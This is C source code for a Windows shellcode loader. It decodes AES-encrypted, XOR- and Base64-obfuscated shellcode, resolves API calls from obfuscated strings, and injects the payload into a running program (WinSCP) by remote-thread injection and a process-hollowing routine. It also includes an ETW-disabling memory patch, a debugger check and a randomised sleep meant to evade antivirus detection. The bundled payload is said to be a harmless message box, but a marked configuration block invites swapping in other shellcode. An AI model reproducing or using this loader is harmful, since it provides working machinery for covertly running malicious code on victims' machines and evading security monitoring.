#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/sha.h>
#include "winapi.h"

// Link to Windows system libraries
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ws2_32.lib")

// Crypt parameters
#define AES_KEY_SIZE 32  // 256 bits for AES-256
#define AES_BLOCK_SIZE 16
#define XR_KSIZE 16

// Define variable to print lines or not
#define EN_PRT 1
#if EN_PRT
#define m_prt(fmt, ...) printf(fmt, ##__VA_ARGS__)
#define m_fprt(file, fmt, ...) fprintf(file, fmt, ##__VA_ARGS__)
#else
#define m_prt(fmt, ...) /* No-op */
#define m_fprt(file, fmt, ...) /* No-op */
#endif

// ----------- BEGIN CHANGE THIS BLOCK ---------------
// Also check the winapi.h containing XOR key used to encode WinAPI functions during compiling
#define ORIG_SC_LEN 244

//const char* processinj = "C:\\windows\\explorer.exe";
//const char* processinj = "C:\\Program Files\\WinSCP\\WinSCP.exe";
const char* processinj = "C:\\Program Files (x86)\\WinSCP\\WinSCP.exe";
//const char* processinj = "C:\\windows\\system32\\notepad.exe";

/* Global Base64 encoded and XORRED values */
const char* bxrKey = {
    "U1NBUmphPzQncnVRZjpdZw=="
};
const char* bxrIv = {
    "5j1x3gRl9aLzTNH+akpolg=="
};
const char* bxrPwd = {
    "YmFyZl9X"
};
const char* bxrSlt = {
    "8qkvu9VNPLvVAzYL0wkWoA=="
};
// x86 shellcode Messagebox showing "HELLOHELLO"
const char* bxrSc = {
    "Ow964ezZbocWiYzQc0D3gQNLjWGbcB0MXvMGDMDyUUCg5b6WKvTmmvHMvvTycxNcWumQpiqw2kJfBV5h"
    "1VtOG4tCM5EA6a3Smv43Tsd63RyIcRbD1IpD9qZL7fBv6AHTtAeX6JbeuoMGe9wZklrbQrdpCQnbhKQA"
    "k2gLR6PK8K7QmNjXVW4PoYvWofElAy6SmivpqPiUt79529OD+PB2x4Mvp8h9JHn64H7rGDHvT1kHY++q"
    "BxDsHjnYNWJwHxaNg4P2d5CQqpUhKr9E4uE3RfgRYE9y+427vTXrQT0HKHXj3lDm6AKlkBbl5/CSQRwp"
    "jfu5IwvpoR9fnE/vcSLWSw=="
};
// ----------- END CHANGE THIS BLOCK ---------------

// Decrypted shellcode
unsigned char decr_sc[ORIG_SC_LEN];

/* XOR key used for decoding encrypted variables */
unsigned char* xrKey = NULL;
/* Global decoded vars */
unsigned char* Key = NULL;
unsigned char* Iv = NULL;
unsigned char* Pwd = NULL;
unsigned char* Slt = NULL;
unsigned char* Sc = NULL;

/* Functions used during program */
void dec_vars();
void prt_dat(const char* title, const void* data, int len, int is_oneliner);
void cp_decr(unsigned char* shell_dec, int lenDecShell, unsigned char* shellcode, int original_len);
void cp_arr(unsigned char* src, unsigned char* dest, int src_len, int dest_len);
int decr(unsigned char* ciphertext, int ciphertext_len, unsigned char* key, unsigned char* iv, unsigned char* plaintext);
int fnd_proc(const char* process_name, int* pid, int* baseaddr);
void inj_sc(DWORD pid, unsigned char* shellcode, int shellcode_len);
void proc_hol(unsigned char* shellcode, int shellcode_len, int baseaddr, int targetPid);
int dis_et(HANDLE hProcess);
void del_ex();
void xr(char* str, size_t len);
unsigned char* b64_dec(const char* input, int* output_length);
char* xr_dec(const unsigned char* data, size_t len);

int main(int argc, char** argv)
{
    // Variables
    int lenBits = AES_KEY_SIZE * 8;  // AES-256 (256 bits)
    int lenShell = ORIG_SC_LEN;  // Using the predefined length of original shellcode
    unsigned char derivedKey[AES_KEY_SIZE + AES_BLOCK_SIZE];  // Key and IV (256-bit key + 128-bit IV)
    int pid = 0;
    int baseaddr = 0;

    // Base64 and XOR decode shellcode related variables
    // Includes un'XORRING Windows API functions
    dec_vars();

    // DEBUG PRINTING
    m_prt("Decoded XOR key: %s\n", xrKey);
    m_prt("Decoded password: %s\n", Pwd);
    size_t lenSlt = strlen((char*)Slt);
    prt_dat("Decoded salt", Slt, lenSlt, 1);
    size_t lenIv = strlen((char*)Iv);
    prt_dat("Decoded IV", Iv, lenIv, 1);
    size_t lenSc = strlen((char*)Sc);
    prt_dat("Decoded shellcode", Sc, 280, 0);

    // Disable OpenSSL to load default config
    OPENSSL_config(NULL);

    // Derive key and IV using PBKDF2 from the hardcoded pswd and salt
    //if (!PKCS5_PBKDF2_HMAC_SHA1((char*)pswd, strlen((char*)pswd), salt, sizeof(salt), 10000, sizeof(derivedKey), derivedKey)) {
    if (!PKCS5_PBKDF2_HMAC_SHA1(Pwd, strlen((char*)Pwd), Slt, lenSlt, 10000, sizeof(derivedKey), derivedKey)) {
        m_fprt(stderr, "Error deriving key and IV with PBKDF2\n");
        exit(-1);
    }

    unsigned char* aesKey = derivedKey;
    unsigned char* ivDec = derivedKey + AES_KEY_SIZE;

    // Buffers for decryption
    const size_t lenDec = ((lenShell + AES_BLOCK_SIZE - 1) / AES_BLOCK_SIZE) * AES_BLOCK_SIZE;  // Ensure we have a multiple of AES_BLOCK_SIZE
    unsigned char* shell_dec = malloc(lenDec);  // Allocate memory for decrypted shellcode
    if (!shell_dec) {
        m_prt("malloc failed\n");
        exit(-1);
    }
    memset(shell_dec, 0, lenDec);  // Padding the encrypted data buffer

    // Decrypt the shellcode
    //int lenDecShell = decr(encr_sc, lenDec, aesKey, ivDec, shell_dec);
    int lenDecShell = decr(Sc, lenDec, aesKey, ivDec, shell_dec);
    if (lenDecShell == 0) {
        m_fprt(stderr, "Error finalizing AES decryption\n");
        free(shell_dec);
        return -1;
    }

    // Fill the shellcode with the repeated decrypted content
    cp_arr(shell_dec, decr_sc, lenShell, sizeof(decr_sc));

    // Print the decrypted shellcode
    prt_dat("\nDECRYPTED SHELLCODE", decr_sc, lenShell, 1);

    // Find the process ID of explorer.exe (or any other process like svchost.exe)
    fnd_proc(processinj,&pid,&baseaddr);

    // Check PID and inject decrypted shellcode into process
    if (pid != 0) {
        // Delay execution for some AV detection timeouts
        //delay_ex();

        // DEFUNCT; Disable ETW
        //dis_et(pid);

        // Inject shellcode into process
        //inj_sc(pid, decr_sc, sizeof(decr_sc));

        // Inject shellcode into process using process hollowing
        proc_hol(decr_sc, sizeof(decr_sc), baseaddr, pid);
    }
    else {
        m_fprt(stderr, "Failed to find the process %s\n", processinj);
        free(shell_dec);
        return -1;
    }

    // Free the allocated memory for the decrypted string
    free(shell_dec);

    return 0;
}

void cp_decr(unsigned char* shell_dec, int lenDecShell, unsigned char* shellcode, int original_len) {
    int index = 0;

    // Loop to repeat the decrypted shell_dec until the original shellcode length is reached
    while (index < original_len) {
        for (int i = 0; i < lenDecShell && index < original_len; i++) {
            shellcode[index++] = shell_dec[i];
        }
    }
}

void cp_arr(unsigned char* src, unsigned char* dest, int src_len, int dest_len) {
    // Calculate the number of elements to copy (whichever is smaller, src_len or dest_len)
    int len_to_copy = (src_len < dest_len) ? src_len : dest_len;

    for (int i = 0; i < len_to_copy; i++) {
        dest[i] = src[i];  // Copy elements from src to dest
    }
}

void prt_dat(const char* title, const void* data, int len, int is_oneliner)
{
    m_prt("%s:\n", title);
    unsigned char* p = (unsigned char*)data;

    if (is_oneliner) {
        m_prt("\"");
        for (int i = 0; i < len; i++) {
            m_prt("\\x%02X", p[i]);
        }
        m_prt("\"\n");
    }
    else {
        m_prt("  ");
        for (int i = 0; i < len; i++) {
            m_prt("\\x%02X", p[i]);
        }
        m_prt("\n");
    }
}

void* lookup_func(const char* moduleName, const char* functionName) {
    // Get the handle of the module (DLL)    
    HMODULE hModule = LoadLibraryA(moduleName);
    if (hModule == NULL) {
        // Module is not loaded, retrieve the last error and provide more information
        //DWORD error = GetLastError();
        //m_prt("Module not found: %s (Error Code: %lu)\n", moduleName, error);
        m_prt("Module not found: %s\n", moduleName);
        return NULL;
    }

    // Get the address of the function in the module
    FARPROC funcAddress = GetProcAddress(hModule, functionName);
    if (funcAddress == NULL) {
        // Function is not found, retrieve the last error for more context
        //DWORD error = GetLastError();
        //m_prt("Function not found: %s (Error Code: %lu)\n", functionName, error);
        m_prt("Function not found: %s\n", functionName);
        return NULL;
    }

    return funcAddress;
}

int fnd_proc(const char* process_name, int* pid, int* baseaddr) {
    DWORD processes[1024], cbNeeded, cProcesses;

    m_prt("\nFinding process ID and base address based on name %s ...\n", process_name);

    // Enumerate all processes
    pEnumProcesses NtEnumProcesses = (pEnumProcesses)lookup_func(papdl, pEnProc);
    if(!NtEnumProcesses(processes, sizeof(processes), &cbNeeded)) {
        m_fprt(stderr, "EnumProcesses failed\n");
        return 0;
    }

    cProcesses = cbNeeded / sizeof(DWORD);

    // Iterate through processes and match by executable name (case-insensitive)
    for (unsigned int i = 0; i < cProcesses; i++) {
        if (processes[i] == 0) continue;
        // Get the address of OpenProcess dynamically
        pOpenProcess NtOpenProcess = (pOpenProcess)lookup_func(k32dl, kOpProc);
        pEnumProcessModules NtEnumProcessModules = (pEnumProcessModules)lookup_func(papdl, pEnProcMod);
        pGetModuleFileNameExA NtGetModuleFileNameExA = (pGetModuleFileNameExA)lookup_func(papdl, pGModFname);
        pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func(k32dl, kChand);

        // Open the process with sufficient access rights only if it's a potential match
        HANDLE hProcess = NtOpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
        if (hProcess != NULL) {
            // Check process modules using EnumProcessModules
            DWORD cbNeededModules;
            HMODULE hMods[1024];
            if (NtEnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeededModules)) {
                //m_prt("Found %lu modules for process %lu\n", cbNeededModules / sizeof(HMODULE), processes[i]);
                for (unsigned int j = 0; j < (cbNeededModules / sizeof(HMODULE)); j++) {
                    char filename[MAX_PATH];
                    if (NtGetModuleFileNameExA(hProcess, hMods[j], filename, sizeof(filename) / sizeof(char))) {
                        // Check if the filename matches the process_name (case-insensitive)
                        if (_stricmp(filename, process_name) == 0) {
                            *pid = (int)processes[i];
                            *baseaddr = (int)hMods[j];
                            m_prt("Found matching process: %d (%s)\nBase address: %x\n\n", *pid, filename, *baseaddr);
                            NtCloseHandle(hProcess);
                            return 1;
                        }
                    }
                }
            }
            NtCloseHandle(hProcess);
        }
    }
    return 0; // Process not found
}

void inj_sc(DWORD pid, unsigned char* shellcode, int shellcode_len) {
    // Get the address of OpenProcess dynamically
    pOpenProcess NtOpenProcess = (pOpenProcess)lookup_func(k32dl, kOpProc);
    pGetLastError NtGetLastError = (pGetLastError)lookup_func(k32dl, kGLErr);

    // Open the target process with appropriate access
    HANDLE hProcess = NtOpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
    if (!hProcess) {
        m_fprt(stderr, "Failed to open process (PID: %lu) - Error: %lu\n", pid, NtGetLastError());
        return;
    }

    // Get address
    pVirtualAllocEx NtVirtualAllocEx = (pVirtualAllocEx)lookup_func(k32dl, kVAlEx);

    // Allocate memory in the target process to store the shellcode
    LPVOID remoteMemory = NtVirtualAllocEx(hProcess, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        m_fprt(stderr, "Failed to allocate memory in target process\n");
        pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func(k32dl, kChand);
        NtCloseHandle(hProcess);
        return;
    }

    // Write the shellcode to the allocated memory
    pWriteProcessMemory NtWriteProcessMemory = (pWriteProcessMemory)lookup_func(k32dl, kWpm);
    if (!NtWriteProcessMemory(hProcess, remoteMemory, shellcode, shellcode_len, NULL)) {
        m_fprt(stderr, "Failed to write shellcode to process memory\n");
        pVirtualFreeEx NtVirtualFreeEx = (pVirtualFreeEx)lookup_func(k32dl, kVFrEx);
        NtVirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func(k32dl, kChand);
        NtCloseHandle(hProcess);
        return;
    }

    // Create a remote thread to execute the shellcode
    pCreateRemoteThread NtCreateRemoteThread = (pCreateRemoteThread)lookup_func(k32dl, kCrRemThr);
    HANDLE hThread = NtCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
    if (!hThread) {
        m_fprt(stderr, "Failed to create remote thread - Error: %lu\n", NtGetLastError());
        pVirtualFreeEx NtVirtualFreeEx = (pVirtualFreeEx)lookup_func(k32dl, kVFrEx);
        NtVirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func(k32dl, kChand);
        NtCloseHandle(hProcess);
        return;
    }

    // Wait for the thread to finish execution (optional)
    pWaitForSingleObject NtWaitForSingleObject = (pWaitForSingleObject)lookup_func(k32dl, kWSingObj);
    NtWaitForSingleObject(hThread, INFINITE);

    // Clean up: Close the thread handle and free the allocated memory
    pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func(k32dl, kChand);
    NtCloseHandle(hThread);
    pVirtualFreeEx NtVirtualFreeEx = (pVirtualFreeEx)lookup_func(k32dl, kVFrEx);
    NtVirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
    NtCloseHandle(hProcess);

    m_prt("Shellcode injected and executed successfully.\n");
}
// Process hollowing function
void proc_hol(unsigned char* shellcode, int shellcode_len, int baseaddr, int targetPid)
{
    pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)lookup_func(ntdl, nNqip);
    pCreateProcessA NtCreateProcessA = (pCreateProcessA)lookup_func(k32dl, kCrPrA);
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)lookup_func(ntdl, nUnMvs);
    pGetLastError NtGetLastError = (pGetLastError)lookup_func(k32dl, kGLErr);
    pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func(k32dl, kChand);
    pTerminateProcess NtTerminateProcess = (pTerminateProcess)lookup_func(k32dl, kTermPr);
    pVirtualAllocEx NtVirtualAllocEx = (pVirtualAllocEx)lookup_func(k32dl, kVAlEx);
    pVirtualFreeEx NtVirtualFreeEx = (pVirtualFreeEx)lookup_func(k32dl, kVFrEx);
    pWriteProcessMemory NtWriteProcessMemory = (pWriteProcessMemory)lookup_func(k32dl, kWpm);
    pWaitForSingleObject NtWaitForSingleObject = (pWaitForSingleObject)lookup_func(k32dl, kWSingObj);
    pCreateRemoteThread NtCreateRemoteThread = (pCreateRemoteThread)lookup_func(k32dl, kCrRemThr);
    pResumeThread NtResumeThread = (pResumeThread)lookup_func(k32dl, kResThr);
    pOpenProcess NtOpenProcess = (pOpenProcess)lookup_func(k32dl, kOpProc);

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    PROCESS_BASIC_INFORMATION pbi;
    ULONG len = 0;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);

    ACCESS_MASK access = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE;
    HANDLE hProcess = NtOpenProcess(access, FALSE, targetPid);
    if (!hProcess) {
        DWORD dwError = GetLastError();
        m_prt("Failed to open target process: 0x%X\n", dwError);
        return;
    }

    // Create the target process in a suspended state
    if (!NtCreateProcessA(NULL, processinj, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        DWORD dwError = NtGetLastError();
        m_fprt(stderr, "Failed to create process %s in suspended state\n", processinj);
        //m_fprt(stderr, "Failed to create process %s in suspended state\n", targetProc);
        m_prt("CreateProcess failed with error code: %lu\n", dwError);
        return;
    }

    // Debug: print the base address to ensure it's correct
    //m_prt("Base Address of the Process: 0x%p\n", baseaddr);

    /*
    // Try to unmap the section with the correct base address
    NTSTATUS unmapStatus = NtUnmapViewOfSection(pi.hProcess, baseaddr);
    if (unmapStatus != 0) {
        m_fprt(stderr, "Failed to unmap view of section in target process, Error Code: 0x%X\n", unmapStatus);
        // Handle error gracefully, terminate process if necessary
        NtTerminateProcess(pi.hProcess, 0);
        NtCloseHandle(pi.hProcess);
        NtCloseHandle(pi.hThread);
        return;
    }
    */

    // Allocate memory for the shellcode in the target process
    LPVOID remoteMemory = NtVirtualAllocEx(pi.hProcess, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        DWORD dwError = NtGetLastError();
        m_fprt(stderr, "Failed to allocate memory in target process - Error: %lu\n", dwError);
        NtTerminateProcess(pi.hProcess, 0);
        NtCloseHandle(pi.hProcess);
        NtCloseHandle(pi.hThread);
        return;
    }

    // Write the shellcode to the allocated memory
    if (!NtWriteProcessMemory(pi.hProcess, remoteMemory, shellcode, shellcode_len, NULL)) {
        DWORD dwError = NtGetLastError();
        m_fprt(stderr, "Failed to write shellcode to process memory - Error: %lu\n", dwError);
        NtVirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
        NtTerminateProcess(pi.hProcess, 0);
        NtCloseHandle(pi.hProcess);
        NtCloseHandle(pi.hThread);
        return;
    }  

    // Create a remote thread to execute the shellcode
    HANDLE hThread = NtCreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
    if (!hThread) {
        DWORD dwError = NtGetLastError();
        m_fprt(stderr, "Failed to create remote thread - Error: %lu\n", dwError);
        NtVirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
        NtTerminateProcess(pi.hProcess, 0);
        NtCloseHandle(pi.hProcess);
        NtCloseHandle(pi.hThread);
        return;
    }

    // Wait for the thread to finish execution (optional)
    NtWaitForSingleObject(hThread, INFINITE);

    // Clean up: Close the thread handle and free the allocated memory
    NtCloseHandle(hThread);
    NtVirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);

    // Resume the process to start executing normally
    NtResumeThread(pi.hThread);

    // Clean up: Close the process handle
    NtCloseHandle(pi.hThread);
    NtCloseHandle(pi.hProcess);

    m_prt("Shellcode injected and executed using Process Hollowing.\n");
}

int decr(unsigned char* ciphertext, int ciphertext_len, unsigned char* key, unsigned char* iv, unsigned char* plaintext)
{
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    int len;
    int plaintext_len = 0;

    if (!ctx) {
        m_fprt(stderr, "Error creating EVP cipher context\n");
        return 0;
    }

    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv)) {
        m_fprt(stderr, "Error initializing decryption\n");
        EVP_CIPHER_CTX_free(ctx);
        return 0;
    }

    if (1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len)) {
        m_fprt(stderr, "Error during decryption\n");
        EVP_CIPHER_CTX_free(ctx);
        return 0;
    }

    plaintext_len = len;

    if (1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len)) {
        m_fprt(stderr, "Error finalizing decryption\n");
        EVP_CIPHER_CTX_free(ctx);
        return 0;
    }

    plaintext_len += len;

    EVP_CIPHER_CTX_free(ctx);

    return plaintext_len;
}

int dbg_pres() {
    pIsDebuggerPresent NtIsDebuggerPresent = (pIsDebuggerPresent)lookup_func(k32dl, kDbgPres);
    return NtIsDebuggerPresent();
}

int dis_et(HANDLE hProcess) {
    unsigned char patch[] = { 0x48, 0x33, 0xc0, 0xc3 };  // Patch to disable ETW
    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)lookup_func(ntdl, nProcVmem);
    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)lookup_func(ntdl, nWrVMem);
    pVirtualQueryEx NtVirtualQueryEx = (pVirtualQueryEx)lookup_func(k32dl, kVQEx);
    pFlushInstrucionCache NtFlushInstructionCache = (pFlushInstrucionCache)lookup_func(k32dl, kFlInstrC);
    pEventWrite NtEventWrite = (pEventWrite)lookup_func(adv32dl, aEvtWr);

    if (!NtProtectVirtualMemory || !NtWriteVirtualMemory || !NtFlushInstructionCache || !NtEventWrite) {
        m_prt("Failed to load required functions.\n");
        return 0;
    }

    if (hProcess == NULL) {
        m_prt("Invalid process handle.\n");
        return 0;
    }

    m_prt("NtEventWrite address: %p\n", NtEventWrite);

    // Query the memory region where NtEventWrite is located
    MEMORY_BASIC_INFORMATION mbi;
    if (NtVirtualQueryEx(hProcess, (LPCVOID)NtEventWrite, &mbi, sizeof(mbi)) == 0) {
        m_prt("Failed to query memory information for NtEventWrite.\n");
        return 0;
    }
    m_prt("NtEventWrite memory protection: 0x%X\n", mbi.Protect);

    // Change memory protection to allow writing
    ULONG oldProtect = 0;
    SIZE_T patchSize = sizeof(patch);
    NTSTATUS status = NtProtectVirtualMemory(hProcess, (PVOID*)&NtEventWrite, &patchSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (status != 0) {
        m_prt("Failed to change memory protection for NtEventWrite: 0x%X\n", status);
        return 0;
    }

    // Write the patch into the memory of the target process
    SIZE_T bytesWritten = 0;
    status = NtWriteVirtualMemory(hProcess, (PVOID)NtEventWrite, patch, patchSize, &bytesWritten);
    if (status != 0 || bytesWritten != patchSize) {
        m_prt("Failed to write to memory: 0x%X, Bytes written: %zu\n", status, bytesWritten);
        // Attempt to restore memory protection before returning
        NtProtectVirtualMemory(hProcess, (PVOID*)&NtEventWrite, &patchSize, oldProtect, &oldProtect);
        return 0;
    }

    // Restore original memory protection
    status = NtProtectVirtualMemory(hProcess, (PVOID*)&NtEventWrite, &patchSize, oldProtect, &oldProtect);
    if (status != 0) {
        m_prt("Failed to restore memory protection for NtEventWrite: 0x%X\n", status);
        return 0;
    }

    // Flush the instruction cache
    NtFlushInstructionCache(hProcess, (PVOID)NtEventWrite, patchSize);

    m_prt("Successfully disabled ETW in target process by patching EtwEventWrite.\n");
    return 1;
}


void del_ex() {
    srand(time(NULL));
    int delay = rand() % 30000 + 10000; // Random delay between 10 and 30 seconds
    Sleep(delay);
}

// Function to XOR function strings
void xr(char* str, size_t len) {
    for (size_t i = 0; i < len; i++) {
        str[i] ^= XKY;
    }
}

// XOR function for shellcode related hardcoded values
unsigned char* xr_dec(const unsigned char* data, size_t len) {
    unsigned char* xordata = (unsigned char*)malloc(len + 1); // +1 for null termination if string
    if (xordata == NULL) {
        m_fprt(stderr, "[!] Error allocating memory for XOR result\n");
        exit(-1);
    }

    for (size_t i = 0; i < len; i++) {
        xordata[i] = data[i] ^ xrKey[i % XR_KSIZE];
    }

    xordata[len] = '\0'; // Null-terminate if working with strings
    return (char*)xordata;
}

// Base64 decode function
unsigned char* b64_dec(const char* input, int* output_length) {
    int input_length = strlen(input);
    int max_output_length = (input_length * 3) / 4; // Estimate output size
    unsigned char* output = (unsigned char*)malloc(max_output_length + 1); // +1 for null terminator
    if (!output) {
        m_fprt(stderr, "Memory allocation failed\n");
        return NULL;
    }

    int len = EVP_DecodeBlock(output, (const unsigned char*)input, input_length);
    if (len < 0) {
        m_fprt(stderr, "Base64 decoding failed\n");
        free(output);
        return NULL;
    }

    // OpenSSL's EVP_DecodeBlock may include padding characters in the output
    while (len > 0 && output[len - 1] == '\0') {
        len--;
    }

    output[len] = '\0'; // Null-terminate the output
    *output_length = len;

    return output;
}

// Decode variables used in program
void dec_vars() {
    int xrLen;
    int ivLen;
    int sltLen;
    int pwdLen;
    int scLen = 244;

    // B64 decode main XOR key
    xrKey = b64_dec(bxrKey, &xrLen);

    // B64 and XOR decode IV
    unsigned char* xrIV = b64_dec(bxrIv, &ivLen);
    Iv = xr_dec(xrIV, ivLen);
    // B64 and XOR decode salt
    unsigned char* xrSlt = b64_dec(bxrSlt, &sltLen);
    Slt = xr_dec(xrSlt, sltLen);
    // B64 and XOR decode password
    unsigned char* xrPwd = b64_dec(bxrPwd, &pwdLen);
    Pwd = xr_dec(xrPwd, pwdLen);
    // B64 and XOR decode shellcode
    unsigned char* xrSc = b64_dec(bxrSc, &scLen);
    Sc = xr_dec(xrSc, scLen);

    /* XOR decode function strings */
    // DLL's
    xr(papdl, strlen(papdl));
    xr(k32dl, strlen(k32dl));
    xr(ntdl, strlen(ntdl));
    xr(adv32dl, strlen(adv32dl));
    // Functions
    xr(pEnProc, strlen(pEnProc));
    xr(kOpProc, strlen(kOpProc));
    xr(pEnProcMod, strlen(pEnProcMod));
    xr(pGModFname, strlen(pGModFname));
    xr(kChand, strlen(kChand));
    xr(kGLErr, strlen(kGLErr));
    xr(kVAlEx, strlen(kVAlEx));
    xr(kWpm, strlen(kWpm));
    xr(kVFrEx, strlen(kVFrEx));
    xr(kVQEx, strlen(kVQEx));
    xr(kCrRemThr, strlen(kCrRemThr));
    xr(kWSingObj, strlen(kWSingObj));
    xr(nNqip, strlen(nNqip));
    xr(kCrPrA, strlen(kCrPrA));
    xr(nUnMvs, strlen(nUnMvs));
    xr(kTermPr, strlen(kTermPr));
    xr(kResThr, strlen(kResThr));
    xr(kDbgPres, strlen(kDbgPres));
    xr(nProcVmem, strlen(nProcVmem));
    xr(nWrVMem, strlen(nWrVMem));
    xr(nReVMem, strlen(nReVMem));
    xr(kFlInstrC, strlen(kFlInstrC));
    xr(aEvtWr, strlen(aEvtWr));
    
}